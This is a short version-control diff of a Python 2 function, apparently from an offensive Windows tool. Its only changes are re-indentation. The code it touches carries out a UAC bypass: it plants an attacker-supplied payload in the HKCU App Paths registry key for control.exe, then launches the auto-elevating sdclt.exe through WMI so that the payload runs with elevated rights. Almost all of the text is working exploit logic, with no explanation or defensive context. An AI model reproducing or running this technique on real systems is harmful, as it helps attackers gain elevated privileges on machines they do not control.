@@ -30,13 +30,13 @@ def sdclt_control():
 		print " {} sdclt_control: Attempting to create registry key".format(infoBox())
 		try:
 			key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
-									os.path.join("Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"))
+						os.path.join("Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"))
 									
 			_winreg.SetValueEx(key,
-								None,
-								0,
-								_winreg.REG_SZ,
-								payload)
+					None,
+					0,
+					_winreg.REG_SZ,
+					payload)
 			_winreg.CloseKey(key)
 			print " {} sdclt_control: Registry key created".format(successBox())
 		except Exception as error:
@@ -49,7 +49,7 @@ def sdclt_control():
 		print " {} sdclt_control: Attempting to create process".format(infoBox())
 		try:
 			result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c start sdclt.exe",
-											ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
+							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
 			if (result[1] == 0):
 				print " {} sdclt_control: Process started successfully".format(successBox())
 			else:
